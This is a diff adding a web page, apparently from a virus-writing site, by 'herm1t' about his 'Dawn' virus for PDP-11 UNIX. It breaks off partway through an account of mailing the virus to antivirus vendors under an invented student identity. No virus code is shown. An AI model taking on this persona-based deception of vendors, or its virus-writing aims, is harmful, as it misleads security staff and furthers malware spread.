@@ -1,0 +1,695 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en">
+<head>
+<title>The Dawn Virus for PDP-11/UNIX5</title>
+<meta http-equiv="content-type" content="text/html; charset=iso-8859-1"/>
+<meta name="author" content="herm1t"/>
+<meta name="keywords" content="herm1t,virus,virii,vx,VX Heavens,UNIX,PDP-11,infection,a.out,Dawn,UNIX.Small.A"/>
+<meta name="description" content="The Dawn Virus for PDP-11/UNIX5"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"5ea29fd341a5f2f33f340c1f122aa8c310edc31f-1498755135-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<style type="text/css">body{background-color:#cccccc;margin:0;padding:0;}#main{background-image:url(img/back.gif);background-repeat:repeat-y;background-position:top left;border-right:solid thin black;border-bottom:solid thin black;width:620px;background-color:#eeeeee;margin:0;padding:0;}.content{margin-left:8px;-moz-border-radius:15px;border:solid thin black;background-color:#fffff8;width:604px;padding:0;margin-bottom:.5em;}p,pre,h1,h2,h3,h4{padding-left:.5em;padding-right:.5em;}.epigraph{float:right;width:27em;}h1,h2{-moz-border-radius-topleft:15px;-moz-border-radius-topright:15px;margin:0;font-size:12pt;background-color:#e0e0d0;border-bottom:solid thin black;}.copy{-moz-border-radius-bottomleft:15px;-moz-border-radius-bottomright:15px;margin:0;font-size:12pt;border-top:solid thin black;background-color:#e0e0d0;}.buttons{margin:0;padding-left:0.2em;width:620px;}h3,h4{margin:0;font-size:12pt;}#movc{border:solid thin black;background-color:#ffffaa;margin:0;padding:0;position:relative;top:2px;right:2px;z-index:2;font-size:6pt;-moz-border-radius:10px;}#movc pre{margin:0;padding:0;font-size:8pt;}.mail_header{font-size:8pt;color:darkgreen;background-color:#e0e0d0;}blockquote{font-size:10pt;margin:0;padding-left:1em;}blockquote p,pre{padding:0;margin:0;font-size:10pt;}ul li a{text-decoration:none;font-weight:bold;}ul li a:hover{background-color:darkblue;color:#fffff0;}.sig{font-size:8pt;color:#aaaaaa;}.epigraph{font-style:italic;font-size:10pt;width:22em;float:right;}</style>
+<script type="text/rocketscript">
+function show_hint(s)
+{
+	if (!document.getElementById)
+		return true;
+	var l = document.getElementById("movc");
+	if (!l)
+		return true;
+	if (s == 1) {
+		l.style.display = 'block';
+	} else {
+		l.style.display = 'none';
+	}
+	return false;
+}
+</script>
+</head>
+<body>
+<div style="" id="main">
+<img src="img/dawn.gif" alt="The Dawn: Tribute to" style="margin-left: 8px; margin-top: 8px;"/>
+<div style="position: absolute; top: 31px; left: 7px;"><img src="img/title.gif" alt="UNIX 5th edition PDP-11"/></div>
+<br/>
+<div class="content" style="margin-top: 120px;">
+<h2>... and how I contacted the AV-vendors and what I learnt</h2>
+<div class="epigraph">
+<strong onmouseover="show_hint(1);" onmouseout="show_hint(0);">014747</strong>
+<pre id="movc" style="display: none; padding: 0; margin: 0;">sim> <strong>e 0-10</strong>
+0:      000000
+2:      000000
+4:      000000
+6:      000000
+10:     000000
+sim> <strong>d 10 014747</strong>
+sim> <strong>run 10</strong>
+Trap stack push abort, PC: 177776 (MOV -(PC),-(PC))
+sim> <strong>e 0-10</strong>
+0:      014747
+2:      014747
+4:      014747
+6:      014747
+10:     014747</pre>
+<br/>-- The worldly wisdom
+</div>
+<br clear="all"/>
+<p><strong>Contents</strong></p>
+<ul>
+<li><a href="#intro">Introduction</a></li>
+<li><a href="#av1">Rocking the boat</a></li>
+<li><a href="#kav">How many virus analysts does it take to <del>catch a virus</del> screw in a light bulb?</a></li>
+<li><a href="#tricks">Tricks of Dawn</a>
+<ul>
+<li>Quick notes on PDP-11</li>
+<li>Instruction summary</li>
+<li>Calling the system</li>
+<li>Position independent code</li>
+<li>Reading directory</li>
+<li>The a.out format</li>
+</ul></li>
+<li><a href="#src">The source code</a></li>
+<li><a href="#ref">References</a></li>
+<li><a href="#files">Files</a></li>
+</ul>
+<div class="copy">&nbsp;Copyright &copy; 2006,2007 herm1t &lt;<a href="/cdn-cgi/l/email-protection#016964736c30754177792f6f64756d74792f6e7366"><span class="__cf_email__" data-cfemail="127a77607f236652646a77603c7d6075">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a></div>
+</div>
+<div id="intro" class="content">
+<h2>Introduction</h2>
+<p><em>...there self-confident author was going to recollect sob-stuff on his own experience with prehistoric computers, bitch about virus and antivirus scenes, draw analogies, make a dark prospects and so on and so forth (because there is nobody to shut him up), but finally decided to cross that crap out...</em></p>
+<p>It was all began in the late eighties when I first came to the console of the computer. It was a russian clone of PDP-11 machine. That's how I fell in love for the first time. Many time has passed since that moment, but I still think that those machines were great, so I decided to contribute something to it <q>in my own particular idiom</q>.</p>
+</div>
+<div id="av1" class="content">
+<h2>Rocking the boat</h2>
+<div class="epigraph">
+Dear First Name Last Name, ...<br/>
+-- Symantec Security Response Automation
+</div>
+<br clear="all"/>
+<p>I was curious on the reaction to this virus from the AV side, so, herm1t magically turned into the indian student whose name is Digamber Mayur (this means "a nacked peacock", if I can rely on the names dictionary where I picked up these names). Digamber was working hard at his WTF university as an assistant preparing the UNIX disk images for the course on computer architectures and accidentially noticed that the image was infected. Surprised, he wrote the following mail to all AV companies he knew:</p>
+<pre>
+From:	Digamber Mayur &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="97f3fef0f6faf5f2e5b9faf6eee2e5d7f0faf6fefbb9f4f8fa">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>
+To:	Ahnlab &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f781c4849884b7969f999b9695d994989a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	ArcaBit &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d2a4bba0a7a192b3a0b1b3b0bba6fcb1bdbf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Avast &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0a7c63787f794a6b7c6b797e24696567">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	AVG &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="21574853545261465348524e47550f425b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	AVIRA &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="44322d3631370425322d36256a272b29">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	BitDefender &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="295f405b5c5a765a5c4b44405a5a404647694b405d4d4c4f4c474d4c5b074a4644">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Command Software &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c6a756e696f5c7f7371717d72787f7371327f7371">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Computer Associates &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="472e3722312e353234073122336924282a692632">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Computer Associates &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="13657a6166605370723d707c7e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	DialogueScience &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="beffd0cad7c8d7ccfedad7dfd2cd90cccb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	"Dr. Web" &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="394f544a795d4b4e5c5b175a5654">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	EmsiSoft &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92e1e7f0fffbe6d2f7ffe1fbe1fdf4e6bcf1fdff">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	eSafe &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6e0b1d0f080b4018071c1b1d2e0b0f020f0a0a0700400d0103">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	ESET &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0172606c716d647241647264752f626e6c">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Ewido &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a8dbddcac5c1dce8cddfc1ccc786c6cddc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Fortinet &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3b484e5956524f4d52494e487b5d54494f52555e4f15585456">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	F-Prot &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="65130c17101609040725034815170a114b060a08">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	F-Secure &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="9ceffdf1ecf0f9efdcfab1eff9ffe9eef9b2fff3f1">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Hauri &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="4820293d3a2171700820293d3a21662b2766233a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	H+BEDV &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="81f7e8f3f4f2c1e0eff5e8f7e8f3afe5e4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Ikarus &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="afcec1cec3d6dccaefc6c4cedddadc81cedb">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Kaspersky &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5f313a2829362d2a2c1f343e2c2f3a2d2c3426713c3032">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	McAfee &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="037570626e736f664362756671776f6261702d606c6e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Microsoft &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2a4b5c595f4847435e6a595f4847435e04474349584559454c5e04494547">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Network Associates &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b4c2ddc6c1c7ebc6d1c7d1d5c6d7dcf4dad5dd9ad7dbd9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Norman &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6908070805101a001a2907061b040807470706">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Panda &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d9afb0abacaaaab8b4a9b5bcaa99a9b8b7bdb8aab6bfadaeb8abbcf7bab6b4">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	QuickHeal &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="36405f4443455a57547647435f555d5e53575a1855595b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
+	Sophos &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="f685979b869a9385b68599869e9985d895999b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>>,
